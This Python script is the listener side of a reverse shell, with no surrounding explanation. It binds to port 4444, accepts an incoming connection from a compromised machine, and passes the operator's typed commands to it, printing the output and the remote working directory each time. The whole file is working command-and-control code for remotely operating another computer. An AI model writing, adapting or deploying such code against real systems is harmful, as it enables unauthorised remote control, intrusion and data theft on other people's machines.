import socket

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 4444
BUFFER = 1024*128


SEPARATOR = "<sep>"

s = socket.socket()

s.bind((SERVER_HOST, SERVER_PORT))

s.listen(5)

print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

cwd = client_socket.recv(BUFFER).decode()
print("[+] Current working directory:", cwd)


while True:
    # get the command from prompt
    command = input(f"{cwd} $> ")
    if not command.strip():
        # empty command
        continue
    # send the command to the client
    client_socket.send(command.encode())
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    # retrieve command results
    output = client_socket.recv(BUFFER).decode()
    # split command output and current directory
    results, cwd = output.split(SEPARATOR)
    # print output
    print(results)
